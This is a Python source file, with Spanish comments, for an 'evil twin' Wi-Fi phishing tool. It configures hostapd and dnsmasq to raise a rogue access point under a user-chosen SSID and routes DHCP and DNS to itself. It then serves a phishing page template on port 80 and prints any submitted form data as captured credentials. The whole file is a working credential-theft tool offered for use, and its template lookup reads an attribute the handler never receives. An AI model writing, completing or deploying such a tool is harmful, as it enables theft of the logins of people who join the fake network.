import os
import subprocess
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from utils.colors import Colors

# Rutas a los binarios y configuraciones
BIN_DIR = os.path.join(os.path.dirname(__file__), "..", "bin")
CONFIG_DIR = os.path.join(os.path.dirname(__file__), "..", "config")
TEMPLATES_DIR = os.path.join(os.path.dirname(__file__), "..", "templates")

class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Sirve el archivo index.html de la plantilla seleccionada
        if self.path == "/":
            self.path = "/index.html"
        try:
            with open(os.path.join(TEMPLATES_DIR, self.template, self.path[1:]), "rb") as file:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(file.read())
        except FileNotFoundError:
            self.send_error(404, "File not found")

    def do_POST(self):
        # Captura las credenciales enviadas por el formulario
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        print(f"{Colors.BOLD}{Colors.OKGREEN}Credenciales capturadas: {post_data}{Colors.ENDC}")
        self.send_response(200)
        self.end_headers()

class WifiPhishing:
    def __init__(self, ssid, template):
        self.ssid = ssid
        self.template = template
        self.interface = "wlan0"  # Cambia esto según tu interfaz Wi-Fi

    def create_access_point(self):
        print(f"{Colors.BOLD}{Colors.OKBLUE}Creando punto de acceso Wi-Fi con SSID: {self.ssid}{Colors.ENDC}")
        try:
            # Configurar hostapd con el archivo de configuración
            hostapd_config = os.path.join(CONFIG_DIR, "hostapd.conf")
            with open(hostapd_config, "w") as f:
                f.write(f"interface={self.interface}\n")
                f.write(f"ssid={self.ssid}\n")
                f.write("driver=nl80211\nhw_mode=g\nchannel=6\nauth_algs=1\nwpa=2\nwpa_passphrase=password123\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\n")
            
            # Ejecutar hostapd
            hostapd_bin = os.path.join(BIN_DIR, "hostapd")
            subprocess.run(["sudo", hostapd_bin, hostapd_config], check=True)
            print(f"{Colors.OKGREEN}Punto de acceso creado exitosamente.{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}Error al crear el punto de acceso: {e}{Colors.ENDC}")

    def start_dnsmasq(self):
        print(f"{Colors.BOLD}{Colors.OKBLUE}Iniciando dnsmasq...{Colors.ENDC}")
        try:
            # Configurar dnsmasq
            dnsmasq_config = os.path.join(CONFIG_DIR, "dnsmasq.conf")
            with open(dnsmasq_config, "w") as f:
                f.write(f"interface={self.interface}\n")
                f.write("dhcp-range=192.168.1.10,192.168.1.100,12h\n")
                f.write("dhcp-option=3,192.168.1.1\n")
                f.write("dhcp-option=6,192.168.1.1\n")
                f.write("server=8.8.8.8\nlog-queries\nlog-dhcp\n")
            
            # Ejecutar dnsmasq
            dnsmasq_bin = os.path.join(BIN_DIR, "dnsmasq")
            subprocess.run(["sudo", dnsmasq_bin, "-C", dnsmasq_config], check=True)
            print(f"{Colors.OKGREEN}dnsmasq iniciado exitosamente.{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}Error al iniciar dnsmasq: {e}{Colors.ENDC}")

    def start_phishing_server(self):
        print(f"{Colors.BOLD}{Colors.OKBLUE}Iniciando servidor de phishing...{Colors.ENDC}")
        server = HTTPServer(("0.0.0.0", 80), PhishingHandler)
        server.template = self.template
        server.serve_forever()

    def start(self):
        # Crear el punto de acceso en un hilo separado
        ap_thread = threading.Thread(target=self.create_access_point)
        ap_thread.daemon = True
        ap_thread.start()

        # Iniciar dnsmasq en un hilo separado
        dnsmasq_thread = threading.Thread(target=self.start_dnsmasq)
        dnsmasq_thread.daemon = True
        dnsmasq_thread.start()

        # Iniciar el servidor de phishing
        self.start_phishing_server()

def list_templates():
    # Lista las plantillas disponibles en la carpeta templates
    templates = [name for name in os.listdir(TEMPLATES_DIR) if os.path.isdir(os.path.join(TEMPLATES_DIR, name))]
    return templates

def wifi_phishing():
    ssid = input(f"{Colors.BOLD}{Colors.WARNING}Introduce el nombre del SSID: {Colors.ENDC}")
    templates = list_templates()
    print(f"{Colors.BOLD}{Colors.OKBLUE}Plantillas disponibles:{Colors.ENDC}")
    for i, template in enumerate(templates):
        print(f"{Colors.OKGREEN}{i + 1}. {template}{Colors.ENDC}")
    choice = input(f"{Colors.BOLD}{Colors.WARNING}Selecciona una plantilla (1-{len(templates)}): {Colors.ENDC}")
    try:
        template = templates[int(choice) - 1]
    except (IndexError, ValueError):
        print(f"{Colors.FAIL}Selección no válida. Usando plantilla por defecto.{Colors.ENDC}")
        template = "default"

    phishing = WifiPhishing(ssid, template)
    phishing.start()